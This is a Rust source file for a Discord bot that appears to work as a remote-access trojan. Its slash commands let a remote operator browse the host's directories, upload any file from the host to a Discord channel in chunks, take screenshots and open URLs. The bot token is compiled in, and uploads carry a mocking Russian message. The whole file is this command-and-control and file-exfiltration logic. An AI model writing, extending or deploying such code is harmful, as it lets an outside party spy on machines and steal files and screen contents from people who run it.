#![allow(non_snake_case)]

mod commands;
mod dowithsys;

use serde::Deserialize;
use serde_json;
use serenity::all::{CreateAttachment, GuildId, Ready};
use serenity::async_trait;
use serenity::builder::{CreateInteractionResponse, CreateInteractionResponseMessage};
use serenity::model::application::Interaction;
use serenity::prelude::*;
use serenity::json::json;
use tokio::sync::Mutex;

use std::env::current_dir;
use std::fs::File;
use std::io::Read;
use std::path::Path;
use std::str::FromStr;

const MAX_FILE_SIZE: usize = 8 * 1024 * 1024;

#[derive(Deserialize)]
struct Config {
    TOKEN: String,
    GUIDID: String,
}

struct Handler {
    now_path: Mutex<String>,
}

#[async_trait]
impl EventHandler for Handler {
    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
        let mut nowpath = self.now_path.lock().await;
        if let Interaction::Command(command) = interaction {
            let content = match command.data.name.as_str() {
                "cd" => Some(commands::cd::run(&command.data.options(), &mut *nowpath)),
                "ls" => Some(commands::ls::run(&mut *nowpath)),
                "sendfile" => Some(commands::sendfile::run(
                    &command.data.options(),
                    &mut *nowpath,
                )),
                "ping_bot" => Some(commands::ping::run()),
                "pwd" => Some(commands::pwd::run(&mut *nowpath)),
                "screenshot" => Some(commands::screenshot::run()),
                "openurl" => Some(commands::openurl::run(&command.data.options())),
                _ => Some("not implemented ".to_string()),
            };
            if let Some(content) = content {
                if command.data.name == "sendfile" {
                    if content == "not" {
                        let data =
                            CreateInteractionResponseMessage::new().content("Not valid command");
                        let builder = CreateInteractionResponse::Message(data);
                        if let Err(why) = command.create_response(&ctx.http, builder).await {
                            println!("Cannot respond to slash command: {why}");
                        }
                    } else {
                        let mut file_bytes = File::open(content.clone()).expect("");
                        let mut buffer = Vec::new();

                        file_bytes.read_to_end(&mut buffer).expect(" ");

                        let vectors: Vec<Vec<u8>> =
                            buffer.chunks(MAX_FILE_SIZE).map(|ch| ch.to_vec()).collect();
                        let fomratfile = get_file_extension(&content);

                        for i in 0..vectors.len() {
                            let mut ca_vector: Vec<CreateAttachment> = Vec::new();
                            ca_vector.push(CreateAttachment::bytes(
                                vectors[i].clone(),
                                format!("{}.{}.{}", get_file_name_without_extension(&content),i, fomratfile),
                            ));

                            let map = json!({"message": "Ya hui znayet blyat"});
                            let msgg = ctx.http.send_message(command.channel_id, ca_vector, &map).await;
                            println!("\n\n{:?}\n\n", msgg);
                        }
                    }
                } else if command.data.name == "screenshot" {
                    let ch = dowithsys::screenshot::make_screenshot().await;
                    let data = CreateInteractionResponseMessage::new().add_file(ch);
                    let builder = CreateInteractionResponse::Message(data);
                    if let Err(why) = command.create_response(&ctx.http, builder).await {
                        println!("Cannot respond to slash command: {why}");
                    }
                } else {
                    let data = CreateInteractionResponseMessage::new().content(content);
                    let builder = CreateInteractionResponse::Message(data);
                    if let Err(why) = command.create_response(&ctx.http, builder).await {
                        println!("Cannot respond to slash command: {why}");
                    }
                }
            }
        }
    }
    async fn ready(&self, ctx: Context, _ready: Ready) {
        let guild_id = GuildId::from_str(&config_reader().GUIDID).unwrap();

        let _commands = guild_id
            .set_commands(
                &ctx.http,
                vec![
                    commands::cd::register(),
                    commands::ls::register(),
                    commands::sendfile::register(),
                    commands::ping::register(),
                    commands::pwd::register(),
                    commands::screenshot::register(),
                    commands::openurl::register(),
                ],
            )
            .await;
    }
}

#[tokio::main]
async fn main() {
    let token = config_reader().TOKEN;

    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let mut client = Client::builder(&token, intents)
        .event_handler(Handler {
            now_path: Mutex::new(current_dir().unwrap().to_str().unwrap().to_string()),
        })
        .await
        .unwrap();

    if let Err(why) = client.start().await {
        println!("Error client started: {why:?}");
    }
}

fn get_file_extension(filename: &str) -> String {
    match filename.rfind('.') {
        Some(idx) => filename[idx + 1..].to_lowercase(),
        None => String::new(),
    }
}

fn get_file_name_without_extension(path: &str) -> &str {
    let path = Path::new(path);
    let name = path.file_stem().unwrap();
    name.to_str().unwrap()
}

fn config_reader() -> Config {
    let res = include_str!("config.json");
    let des: Config = serde_json::from_str(res).unwrap();
    return des;
}
